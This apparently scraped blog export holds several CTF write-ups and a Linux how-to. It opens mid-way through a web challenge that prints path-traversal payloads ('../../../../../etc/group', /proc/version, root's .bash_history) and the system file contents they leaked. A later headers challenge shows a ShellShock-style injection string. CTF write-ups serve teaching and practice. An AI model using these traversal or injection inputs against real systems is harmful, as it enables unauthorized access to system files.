22ï¿½USER=ctfuserï¿½SHLVL=4ï¿½HOME=/home/ctfuserï¿½SSH_TTY=/dev/pts/4ï¿½LOGNAME=ctfuserï¿½EVENT_NOEPOLL=1ï¿½_=/usr/bin/pythonï¿½XDG_SESSION_ID=9ï¿½TERM=screen-256colorï¿½PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/gamesï¿½XDG_RUNTIME_DIR=/run/user/1000ï¿½LANG=en_US.UTF-8ï¿½LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:ï¿½SHELL=/bin/bashï¿½LESSCLOSE=/usr/bin/lesspipe %s %sï¿½PWD=/home/ctfuser/Web-300/appï¿½SSH_CONNECTION=192.168.0.104 57282 192.168.30.121 22ï¿½TMUX_PANE=%4ï¿½ bork=../../../../../etc/group 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657root:x:0:daemon:x:1:bin:x:2:sys:x:3:adm:x:4:syslog,ubuntutty:x:5:disk:x:6:lp:x:7:mail:x:8:news:x:9:uucp:x:10:man:x:12:proxy:x:13:kmem:x:15:dialout:x:20:ubuntufax:x:21:voice:x:22:cdrom:x:24:ubuntufloppy:x:25:ubuntutape:x:26:sudo:x:27:ubuntuaudio:x:29:ubuntudip:x:30:ubuntuwww-data:x:33:backup:x:34:operator:x:37:list:x:38:irc:x:39:src:x:40:gnats:x:41:shadow:x:42:utmp:x:43:video:x:44:ubuntusasl:x:45:plugdev:x:46:ubuntustaff:x:50:games:x:60:users:x:100:nogroup:x:65534:systemd-journal:x:101:systemd-timesync:x:102:systemd-network:x:103:systemd-resolve:x:104:systemd-bus-proxy:x:105:input:x:106:crontab:x:107:syslog:x:108:netdev:x:109:ubuntulxd:x:110:ubuntumessagebus:x:111:uuidd:x:112:mlocate:x:113:ssh:x:114:admin:x:115:ubuntu:x:1000:docker:x:116:ubuntuctfuser:x:1001: bork=../../../../../etc/issue : Ubuntu 16.04.1 LTS \\n \\l bork=../../../../../proc/version : Linux version 4.4.0-47-generic (buildd@lcy01-03) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.2) ) #68-Ubuntu SMP Wed Oct 26 19:39:52 UTC 2016 bork=../../../../../etc/profile : 123456789101112131415161718192021222324252627&quot;# /etc/profile: system-wide .profile file for the Bourne shell (sh(1))# and Bourne compatible shells (bash(1), ksh(1), ash(1), ...).if [ &amp;#34;$PS1&amp;#34; ]; then if [ &amp;#34;$BASH&amp;#34; ] &amp;amp;&amp;amp; [ &amp;#34;$BASH&amp;#34; != &amp;#34;/bin/sh&amp;#34; ]; then # The file bash.bashrc already sets the default PS1. # PS1=&amp;#39;\\h:\\w\\$ &amp;#39; if [ -f /etc/bash.bashrc ]; then . /etc/bash.bashrc fi else if [ &amp;#34;`id -u`&amp;#34; -eq 0 ]; then PS1=&amp;#39;# &amp;#39; else PS1=&amp;#39;$ &amp;#39; fi fifiif [ -d /etc/profile.d ]; then for i in /etc/profile.d/*.sh; do if [ -r $i ]; then . $i fi done unset ifi bork=../../../../../root/.bash_history : youtube video bork=../../../../../var/log/dmessage : No such file or directory bork=../../../../../var/mail/root : No such file or directory bork=../../../../../var/spool/cron/crontabs/root : Permission denied bork=../../../../../home/ctfuser/flag.txt : No such file or directory bork=../../../../../home/ctfuser/Web-300/app/.htaccess : youtube video bork=../../../../../home/ctfuser/Web-300/app/flag.txt : youtube video bork=../../../../../usr/bin/lesspipe : 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313#!/bin/sh## lessfile/lesspipe# $Id: lessopen,v 1.4 1998/05/12 09:37:46 torin Exp $# Plus POSIX sh changes by Y.Dirson## Less filter for viewing non text files.## Written by: Behan Webster &amp;lt;behanw@pobox.com&amp;gt;# Many Modifications by Darren Stalder# Further Modifications by Thomas Schoepf &amp;lt;schoepf@debian.org&amp;gt;## combined lessfile and lesspipe to avoid duplication of decode stage# shell is sure icky. I&amp;#39;m real tempted to rewrite the whole thing in Perl## Unfortunately, this means that I have filename dependencies sprinkled# throughout the code. If you don&amp;#39;t want lessfile to be called that,# you&amp;#39;ll need to change the LESSFILE envar below.## Usage: eval `lessfile` or eval `lesspipe`## less passes in:# $1 filename to be viewed with less (used by LESSOPEN)# and possibly (if used by lessfile)# $2 filename that was created during LESSOPENTMPDIR=$&#123;TMPDIR:-/tmp&#125;BASENAME=`basename $0`LESSFILE=lessfile# Helper function to list contents of ISO files (CD images)iso_list() &#123; isoinfo -d -i &amp;#34;$1&amp;#34; isoinfo -d -i &amp;#34;$1&amp;#34; | grep -q ^Rock\\.Ridge &amp;amp;&amp;amp; iiopts=&amp;#34;$iiopts -R&amp;#34; isoinfo -d -i &amp;#34;$1&amp;#34; | grep -q ^Joliet &amp;amp;&amp;amp; iiopts=&amp;#34;$iiopts -J&amp;#34; echo isoinfo -f $iiopts -i &amp;#34;$1&amp;#34;&#125;if [ $# -eq 1 ] ; then # we were called as LESSOPEN # if the file doesn&amp;#39;t exist, we don&amp;#39;t do anything if [ ! -r &amp;#34;$1&amp;#34; ]; then exit 0 fi # generate filename for possible use by lesspipe umask 077 if [ $BASENAME = $LESSFILE ]; then TMPFILE=`tempfile -d $TMPDIR -p lessf` if [ -z &amp;#34;$TMPFILE&amp;#34; ]; then echo &amp;gt;&amp;amp;2 &amp;#34;Could not find essential program &amp;#39;tempfile&amp;#39;. Exiting&amp;#34; exit 1 fi fi ( # possibly redirect stdout to a file for lessfile if [ $BASENAME = $LESSFILE ]; then exec &amp;gt; $TMPFILE; fi # Allow for user defined filters #if [ -x ~/.lessfilter -a -O ~/.lessfilter ]; then if [ -x ~/.lessfilter ]; then ~/.lessfilter &amp;#34;$1&amp;#34; if [ $? -eq 0 ]; then if [ $BASENAME = $LESSFILE ]; then if [ -s $TMPFILE ]; then echo $TMPFILE else rm -f $TMPFILE fi fi exit 0 fi fi # Decode file for less case `echo &amp;#34;$1&amp;#34; | tr &amp;#39;[:upper:]&amp;#39; &amp;#39;[:lower:]&amp;#39;` in *.a) if [ -x &amp;#34;`which ar`&amp;#34; ]; then ar tv &amp;#34;$1&amp;#34; else echo &amp;#34;No ar available&amp;#34;; fi ;; *.arj) if [ -x &amp;#34;`which unarj`&amp;#34; ]; then unarj l &amp;#34;$1&amp;#34; else echo &amp;#34;No unarj available&amp;#34;; fi ;; *.tar.bz2) if [ -x &amp;#34;`which bunzip2`&amp;#34; ]; then bunzip2 -dc &amp;#34;$1&amp;#34; | tar tvvf - else echo &amp;#34;No bunzip2 available&amp;#34;; fi ;; *.bz) if [ -x &amp;#34;`which bunzip`&amp;#34; ]; then bunzip -c &amp;#34;$1&amp;#34; else echo &amp;#34;No bunzip available&amp;#34;; fi ;; *.bz2) if [ -x &amp;#34;`which bunzip2`&amp;#34; ]; then bunzip2 -dc &amp;#34;$1&amp;#34; else echo &amp;#34;No bunzip2 available&amp;#34;; fi ;; *.deb|*.udeb|*.ddeb|*.ipk) echo &amp;#34;$1:&amp;#34;; dpkg --info &amp;#34;$1&amp;#34; echo echo &amp;#39;*** Contents:&amp;#39;; dpkg-deb --contents &amp;#34;$1&amp;#34; ;; *.doc) if [ -x &amp;#34;`which catdoc`&amp;#34; ]; then catdoc &amp;#34;$1&amp;#34; else # no catdoc, read normally if file is text. if ( file &amp;#34;$1&amp;#34; | grep ASCII 2&amp;gt;/dev/null &amp;gt;/dev/null); then cat &amp;#34;$1&amp;#34; else echo &amp;#34;No catdoc available&amp;#34;; fi fi ;; *.gif|*.jpeg|*.jpg|*.pcd|*.png|*.tga|*.tiff|*.tif) if [ -x &amp;#34;`which identify`&amp;#34; ]; then identify &amp;#34;$1&amp;#34; else echo &amp;#34;No identify available&amp;#34; echo &amp;#34;Install ImageMagick to browse images&amp;#34; fi ;; *.iso) if [ -x &amp;#34;`which isoinfo`&amp;#34; ]; then iso_list &amp;#34;$1&amp;#34; else echo &amp;#34;No isoinfo available&amp;#34; echo &amp;#34;Install mkisofs to view ISO images&amp;#34; fi ;; *.bin|*.raw) if [ -x &amp;#34;`which isoinfo`&amp;#34; ]; then file &amp;#34;$1&amp;#34; | grep -q ISO\\.9660 &amp;amp;&amp;amp; iso_list &amp;#34;$1&amp;#34; else echo &amp;#34;No isoinfo available&amp;#34; echo &amp;#34;Install mkisofs to view ISO images&amp;#34; fi ;; *.lha|*.lzh) if [ -x &amp;#34;`which lha`&amp;#34; ]; then lha v &amp;#34;$1&amp;#34; else echo &amp;#34;No lha available&amp;#34;; fi ;; *.tar.lz|*.tlz) if [ -x &amp;#34;`which lzip`&amp;#34; ]; then lzip -dc &amp;#34;$1&amp;#34; | tar tvvf - elif [ -x &amp;#34;`which lunzip`&amp;#34; ]; then lunzip -dc &amp;#34;$1&amp;#34; | tar tvvf - else echo &amp;#34;No lzip or lunzip available&amp;#34;; fi ;; *.lz) if [ -x &amp;#34;`which lzip`&amp;#34; ]; then lzip -dc &amp;#34;$1&amp;#34; elif [ -x &amp;#34;`which lunzip`&amp;#34; ]; then lunzip -dc &amp;#34;$1&amp;#34; else echo &amp;#34;No lzip or lunzip available&amp;#34;; fi ;; *.tar.lzma) if [ -x &amp;#34;`which lzma`&amp;#34; ]; then lzma -dc &amp;#34;$1&amp;#34; | tar tfvv - else echo &amp;#34;No lzma available&amp;#34; fi ;; *.lzma) if [ -x &amp;#34;`which lzma`&amp;#34; ]; then lzma -dc &amp;#34;$1&amp;#34; else echo &amp;#34;No lzma available&amp;#34; fi ;; *.pdf) if [ -x &amp;#34;`which pdftotext`&amp;#34; ]; then pdftotext -layout &amp;#34;$1&amp;#34; - else echo &amp;#34;No pdftotext available&amp;#34;; fi ;; *.rar|*.r[0-9][0-9]) if [ -x &amp;#34;`which rar`&amp;#34; ]; then rar v &amp;#34;$1&amp;#34; elif [ -x &amp;#34;`which unrar`&amp;#34; ]; then unrar v &amp;#34;$1&amp;#34; else echo &amp;#34;No rar or unrar available&amp;#34;; fi ;; *.rpm) if [ -x &amp;#34;`which rpm`&amp;#34; ]; then echo &amp;#34;$1:&amp;#34;; rpm -q -i -p &amp;#34;$1&amp;#34; echo echo &amp;#39;*** Contents:&amp;#39; rpm -q -l -p &amp;#34;$1&amp;#34; else echo &amp;#34;rpm isn&amp;#39;t available, no query on rpm package possible&amp;#34;; fi ;; *.tar.gz|*.tgz|*.tar.z|*.tar.dz) tar tzvf &amp;#34;$1&amp;#34; --force-local ;; *.tar.xz|*.txz) if [ -x &amp;#34;`which xz`&amp;#34; ]; then xz -dc &amp;#34;$1&amp;#34; | tar tfvv - else echo &amp;#34;No xz available&amp;#34; fi ;; *.xz) if [ -x &amp;#34;`which xz`&amp;#34; ]; then xz -dc &amp;#34;$1&amp;#34; else echo &amp;#34;No xz available&amp;#34; fi ;; # Note that this is out of alpha order so that we don&amp;#39;t catch # the gzipped tar files. *.gz|*.z|*.dz) gzip -dc &amp;#34;$1&amp;#34; ;; *.tar) tar tvf &amp;#34;$1&amp;#34; --force-local ;; *.jar|*.war|*.ear|*.xpi|*.zip) if [ -x &amp;#34;`which unzip`&amp;#34; ]; then unzip -v &amp;#34;$1&amp;#34;; elif [ -x &amp;#34;`which miniunzip`&amp;#34; ]; then miniunzip -l &amp;#34;$1&amp;#34;; elif [ -x &amp;#34;`which miniunz`&amp;#34; ]; then miniunz -l &amp;#34;$1&amp;#34;; else echo &amp;#34;No unzip, miniunzip or miniunz available&amp;#34;; fi ;; *.7z) if [ -x &amp;#34;`which 7za`&amp;#34; ]; then 7za l &amp;#34;$1&amp;#34;; elif [ -x &amp;#34;`which 7zr`&amp;#34; ]; then 7zr l &amp;#34;$1&amp;#34;; else echo &amp;#34;No 7za or 7zr available&amp;#34;; fi ;; *.zoo) if [ -x &amp;#34;`which zoo`&amp;#34; ]; then zoo v &amp;#34;$1&amp;#34;; elif [ -x &amp;#34;`which unzoo`&amp;#34; ]; then unzoo -l &amp;#34;$1&amp;#34;; else echo &amp;#34;No unzoo or zoo available&amp;#34;; fi ;; esac ) 2&amp;gt;/dev/null if [ $BASENAME = $LESSFILE ]; then if [ -s $TMPFILE ]; then echo $TMPFILE else rm -f $TMPFILE fi fielif [ $# -eq 2 ] ; then # # we were called as LESSCLOSE # delete the file created if we were lessfile # if [ $BASENAME = $LESSFILE ]; then if [ -n &amp;#34;$BASH&amp;#34; ]; then if [ ! -O &amp;#34;$2&amp;#34; ]; then echo &amp;#34;Error in deleting $2&amp;#34; &amp;gt; /dev/tty fi fi if [ -f &amp;#34;$2&amp;#34; ]; then rm -f &amp;#34;$2&amp;#34; else echo &amp;#34;Error in deleting $2&amp;#34; &amp;gt; /dev/tty fi fielif [ $# -eq 0 ] ; then # # must setup shell to use LESSOPEN/LESSCLOSE # # I have no idea how some of the more esoteric shells (es, rc) do # things. If they don&amp;#39;t do things in a Bourne manner, send me a patch # and I&amp;#39;ll incorporate it. # # first determine the full path of lessfile/lesspipe # if you can determine a better way to do this, send me a patch, I&amp;#39;ve # not shell-scripted for many a year. FULLPATH=`cd \\`dirname $0\\`;pwd`/$BASENAME case &amp;#34;$SHELL&amp;#34; in *csh) if [ $BASENAME = $LESSFILE ]; then echo &amp;#34;setenv LESSOPEN \\&amp;#34;$FULLPATH %s\\&amp;#34;;&amp;#34; echo &amp;#34;setenv LESSCLOSE \\&amp;#34;$FULLPATH %s %s\\&amp;#34;;&amp;#34; else echo &amp;#34;setenv LESSOPEN \\&amp;#34;| $FULLPATH %s\\&amp;#34;;&amp;#34; echo &amp;#34;setenv LESSCLOSE \\&amp;#34;$FULLPATH %s %s\\&amp;#34;;&amp;#34; fi ;; *) if [ $BASENAME = $LESSFILE ]; then echo &amp;#34;export LESSOPEN=\\&amp;#34;$FULLPATH %s\\&amp;#34;;&amp;#34; echo &amp;#34;export LESSCLOSE=\\&amp;#34;$FULLPATH %s %s\\&amp;#34;;&amp;#34; else echo &amp;#34;export LESSOPEN=\\&amp;#34;| $FULLPATH %s\\&amp;#34;;&amp;#34; echo &amp;#34;export LESSCLOSE=\\&amp;#34;$FULLPATH %s %s\\&amp;#34;;&amp;#34; fi ;; esac #echo &amp;#34;# If you tried to view a file with a name that starts with &amp;#39;#&amp;#39;, you&amp;#34; #echo &amp;#34;# might see this message instead of the file&amp;#39;s contents.&amp;#34; #echo &amp;#34;# To view the contents, try to put &amp;#39;./&amp;#39; ahead of the filename when&amp;#34; #echo &amp;#34;# calling less.&amp;#34;else echo &amp;#34;Usage: eval \\`$BASENAME\\`&amp;#34; exitfi bork=../../../../../tmp/tmux-1000/default : youtube video bork=../../../../../var/mail/ctfuser : No such file or directory bork=../../../../../dev/pts/4 : Permission denied bork=../../../../../home/ctfuser/Web-300/app/bork.py : youtube video We thought that a logical way to solve the challenge was to display /etc/passwd and then some file inside like flag.txt or to inject commands like ls but that didn't work. Another way we thought was to leak /proc/self/environ and them inject some code with user agent but there was not some HTTP_USER_AGENT environment variable.","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"web","slug":"web","permalink":"https://rawsec.ml/tags/web/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"}]},{"title":"RC3 CTF - 200 - Bridge of Cyber - Misc","slug":"RC3CTF-2016-misc-200-bridge-of-cyber","date":"2016-11-20T23:00:00.000Z","updated":"2017-02-07T18:23:36.635Z","comments":true,"path":"en/RC3CTF-2016-misc-200-bridge-of-cyber/","link":"","permalink":"https://rawsec.ml/en/RC3CTF-2016-misc-200-bridge-of-cyber/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : RC3 CTF 2016 Website : http://ctf.rc3.club/ Type : Online Format : Jeopardy CTF Time : link Description Welcome to the &quot;Bridge of Cyber&quot;! It's the same concept as the &quot;Bridge of Death&quot; in Holy Grail. Our DNS servers aren't very good at their job because they ask more questions then they answer. Let's see if you can get the flag from our DNS. Nameserver: ns-920.awsdns-51.net Domain: misc200.ctf.rc3.club Solution What we know: Domain: misc200.ctf.rc3.club Name Server: ns-920.awsdns-51.net We look for questions so probably TXT records 12345678910111213141516171819202122[noraj@rawsec]––––––––––––––––––––––––––––––––––––––––––––––––––[~/CTF/RC3/2016]$ drill misc200.ctf.rc3.club @ns-920.awsdns-51.net TXT;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, rcode: NOERROR, id: 21494;; flags: qr aa rd ; QUERY: 1, ANSWER: 1, AUTHORITY: 4, ADDITIONAL: 0;; QUESTION SECTION:;; misc200.ctf.rc3.club. IN TXT;; ANSWER SECTION:misc200.ctf.rc3.club. 300 IN TXT &quot;What is the air-speed velocity of an unladen swallow&quot;;; AUTHORITY SECTION:misc200.ctf.rc3.club. 172800 IN NS ns-1526.awsdns-62.org.misc200.ctf.rc3.club. 172800 IN NS ns-1842.awsdns-38.co.uk.misc200.ctf.rc3.club. 172800 IN NS ns-489.awsdns-61.com.misc200.ctf.rc3.club. 172800 IN NS ns-920.awsdns-51.net.;; ADDITIONAL SECTION:;; Query time: 225 msec;; SERVER: 205.251.195.152;; WHEN: Sun Nov 20 12:01:47 2016;; MSG SIZE rcvd: 243 So we get the first question: &quot;What is the air-speed velocity of an unladen swallow&quot; is a question from &quot;Bridge of Death&quot; in Holy Grail of Monty Python. The answer is: What do you mean? An African or European swallow? The first idea that matched &quot;How to send the answer&quot; was by prefixing the answer to the domain. 12345[noraj@rawsec]––––––––––––––––––––––––––––––––––––––––––––––––––[~/CTF/RC3/2016]$ drill european.misc200.ctf.rc3.club @ns-920.awsdns-51.net TXT[...]european.misc200.ctf.rc3.club. 300 IN TXT &quot;The roundest knight at king arthurs table was sir cumference. He acquired his size from too much __&quot;[...] The roundest knight at king Arthur’s round table was Sir Cumference. He acquired his size from too much pi. 12345[noraj@rawsec]––––––––––––––––––––––––––––––––––––––––––––––––––[~/CTF/RC3/2016]$ drill pi.european.misc200.ctf.rc3.club @ns-920.awsdns-51.net TXT[...]pi.european.misc200.ctf.rc3.club. 300 IN TXT &quot;What is it that no man ever yet did see, which never was, but always is to be?&quot;[...] Tomorrow 12345[noraj@rawsec]––––––––––––––––––––––––––––––––––––––––––––––––––[~/CTF/RC3/2016]$ drill tomorrow.pi.european.misc200.ctf.rc3.club @ns-920.awsdns-51.net TXT[...]tomorrow.pi.european.misc200.ctf.rc3.club. 300 IN TXT &quot;My favorite things in life don&apos;t cost any money. It&apos;s really clear that the most precious resource we all have is ___&quot;[...] My favorite things in life don't cost any money. It's really clear that the most precious resource we all have is time. 12345678910111213141516171819202122[noraj@rawsec]––––––––––––––––––––––––––––––––––––––––––––––––––[~/CTF/RC3/2016]$ drill time.tomorrow.pi.european.misc200.ctf.rc3.club @ns-920.awsdns-51.net ANY;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, rcode: NOERROR, id: 52009;; flags: qr aa rd ; QUERY: 1, ANSWER: 1, AUTHORITY: 4, ADDITIONAL: 0;; QUESTION SECTION:;; time.tomorrow.pi.european.misc200.ctf.rc3.club. IN TYPE255;; ANSWER SECTION:time.tomorrow.pi.european.misc200.ctf.rc3.club. 300 IN SPF &quot;RC3-2016-cyb3rxr05&quot;;; AUTHORITY SECTION:misc200.ctf.rc3.club. 172800 IN NS ns-1526.awsdns-62.org.misc200.ctf.rc3.club. 172800 IN NS ns-1842.awsdns-38.co.uk.misc200.ctf.rc3.club. 172800 IN NS ns-489.awsdns-61.com.misc200.ctf.rc3.club. 172800 IN NS ns-920.awsdns-51.net.;; ADDITIONAL SECTION:;; Query time: 5244 msec;; SERVER: 205.251.195.152;; WHEN: Sun Nov 20 19:48:48 2016;; MSG SIZE rcvd: 235 So we get the flag: RC3-2016-cyb3rxr05. Or may be it was possible to do it with african: 12345[noraj@rawsec]––––––––––––––––––––––––––––––––––––––––––––––––––[~/CTF/RC3/2016]$ drill african.misc200.ctf.rc3.club @ns-920.awsdns-51.net TXT[...]african.misc200.ctf.rc3.club. 300 IN TXT &quot;Why was the developer broke? He spent all of his&quot;[...]","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"},{"name":"misc","slug":"misc","permalink":"https://rawsec.ml/tags/misc/"}]},{"title":"ArchLinux - Monitor copy progression with Advanced Copy patch","slug":"archlinux-monitor-copy-progression-with-advanced-copy-patch","date":"2016-11-12T23:00:00.000Z","updated":"2017-02-07T18:23:36.918Z","comments":true,"path":"en/archlinux-monitor-copy-progression-with-advanced-copy-patch/","link":"","permalink":"https://rawsec.ml/en/archlinux-monitor-copy-progression-with-advanced-copy-patch/","excerpt":"","text":"Advanced Copy is a mod for the GNU cp and GNU mv tools which adds a progress bar and provides some info on what's going on. It was written by Florian Zwicke and released under the GPL. Original website (http://beatex.org/web/advancedcopy.html) is dead but a backup git repository exist (https://github.com/atdt/advcpmv). Compile from sources You will need gcc, make and patch. 1234567$ wget http://ftp.gnu.org/gnu/coreutils/coreutils-8.21.tar.xz$ tar xvJf coreutils-8.21.tar.xz$ cd coreutils-8.21/$ wget https://raw.githubusercontent.com/atdt/advcpmv/master/advcpmv-0.5-8.21.patch$ patch -p1 -i advcpmv-0.5-8.21.patch$ ./configure$ make The new programs are now located in src/cp and src/mv. Place them somewhere else: 12$ sudo cp src/cp /usr/local/bin/cp$ sudo cp src/mv /usr/local/bin/mv You can make some aliases, for example: 12alias cpa=&apos;/usr/local/bin/cp -g&apos;alias mva=&apos;/usr/local/bin/mv -g&apos; You may want this aliases to be permanent so place them in your ~/.zshrc (or ~/.bashrc) or create a profile script containing the two previous aliases: 1# vim /etc/profile.d/alias-advcpmv.sh And then create another profile script for sudo otherwise you won't be able to call the previous aliases with sudo. To be able to pass aliases to sudo create the following file: 1# vim /etc/profile.d/alias-sudo.sh Containing: 12alias sudo=&apos;sudo &apos;# whitespace ---^ Running Now when using cpa, sudo cpa -rn, etc... you will use /usr/local/bin/cp -g, sudo /usr/local/bin/cp -grn, etc...","categories":[{"name":"linux","slug":"linux","permalink":"https://rawsec.ml/categories/linux/"},{"name":"archlinux","slug":"linux/archlinux","permalink":"https://rawsec.ml/categories/linux/archlinux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://rawsec.ml/tags/linux/"},{"name":"archlinux","slug":"archlinux","permalink":"https://rawsec.ml/tags/archlinux/"}]},{"title":"School CTF - 100 - n4M3 - Forensics","slug":"SchoolCTF-2016-100-forensics-n4M3","date":"2016-11-06T23:00:00.000Z","updated":"2017-02-07T18:23:37.655Z","comments":true,"path":"en/SchoolCTF-2016-100-forensics-n4M3/","link":"","permalink":"https://rawsec.ml/en/SchoolCTF-2016-100-forensics-n4M3/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : School CTF 2016 Website : https://school-ctf.org/ Type : Online Format : Jeopardy - Student CTF Time : link Description Johny Droptables went on the trail of hackers _xXx_-=BoStOnSkIe_Pu$$ies_1337=-_xXx_. You can get the login of one of them. The flag is the login of the hacker. malware Solution Unzip and open malware.exe with an hex editor. You will see a Windows PATH c:\\users\\b05t0n_n491b4t0r_133\\[...]. So we got the login of the guy. Flag: SchoolCTF{b05t0n_n491b4t0r_133}.","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"},{"name":"forensics","slug":"forensics","permalink":"https://rawsec.ml/tags/forensics/"}]},{"title":"School CTF - 100 - Wonder Web - Web","slug":"SchoolCTF-2016-100-web-wonder-web","date":"2016-11-06T23:00:00.000Z","updated":"2017-02-07T18:23:37.658Z","comments":true,"path":"en/SchoolCTF-2016-100-web-wonder-web/","link":"","permalink":"https://rawsec.ml/en/SchoolCTF-2016-100-web-wonder-web/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : School CTF 2016 Website : https://school-ctf.org/ Type : Online Format : Jeopardy - Student CTF Time : link Description In the year 2337 we finally secured the WEB! Now we have headers for anything you want. Everybody can make their site secure just by setting ALL the headers on the server. I just ported a demo page from the future to your time, so you can look how wonderful it is! http://wonder.task.school-ctf.org Solution As the description suggests, let's take a look at headers: 12345678910111213141516171819202122232425262728293031323334353637Allow-Siri-Google-Cortana-Search-Clients: 1Anti-HPKP-Suicide: ignoreAfter=6000000Browser-Restrict: openInNewTab=false; noRefererFromHere=1Check-CDN-Revocation-List: 1; ignoreIfError;Connection: keep-aliveContent-Encoding: gzipContent-Meaning: none; flag-part-number=5 part-content=54f3&#125;;Content-Type: text/html; charset=utf-8Date: Sun, 06 Nov 2016 11:46:31 GMTFlag-First-Part-Is-Here: encoding=base64; part1=U2Nob29sQ1RGezUwbTNkNHk=;Flag-Parts-Connector: character=_; charCode=95; hexCharCode=0x5f;Flag-Security-Policy: headers, ecnryption=none,Server: nginx/1.4.6 (Ubuntu)Set-Cookie: uselessCookie=uselessVal; Secure; StoreEncrypted=1; ExtensionsCanRead=0; DeleteOnBrowserExit=1lStrict-Transport-Security-I-Broke-Something-Please-Downgrade-If-Error: 1Task: category=joy; ucucuga=sure; encoding=none; justString=true; flagPresent=1; flagPart2=17; flagPart4=b3Transfer-Encoding: chunkedX-Bug-Bounty: openRedirects=false; logoutCSRF=false; selfXSS=false;X-Content-Config: blink-origin-in-addressbar, disable-addressbar-copy-paste, disable-javascript-history-apiX-Do-Not-Link-From-These-Sites: /blacklist.txtX-FRAME-Restrict: minhsize:100px; minvsize:100px; readableX-Frame-Options: SAMEORIGINX-Header: meaning=none;X-If-You-Read-This-Join-Tomsk-State-University: additional-points=5; url=http://www.fpmk.tsu.ru/node/474;X-Ignore-CSP-Whitelists: 1X-Mouse-Disable-Click-After-Page: 3 secodnsX-Nikita-Please-Add-This-Header: FalseX-Order-To-KFC: order=coffee; order=fried-potato; transport=SASHAX-Papper-Compatibility: disallowX-ShellShock-vector: ()&#123;;&#125;; echo &quot;Want flag?&quot;; python -c &apos;part3=&quot;77316c6c&quot;; print part3.decode(&quot;hex&quot;)&apos;X-Super-Hero-Status: FalseX-Window-Restrictions: disallow-from-window-openX-XXX-Movie: url=goo.gl/0kGizJY-Toilet-Papper-Compatibility: allowcontent-security-policy: real-strict-dynamicstrict-transport-security: max-age=31536000000000000x-xss-protection: -1; mode=ignoreheader Ok... such a mess... and such a troll challenge! Part 1: 12$ echo -n 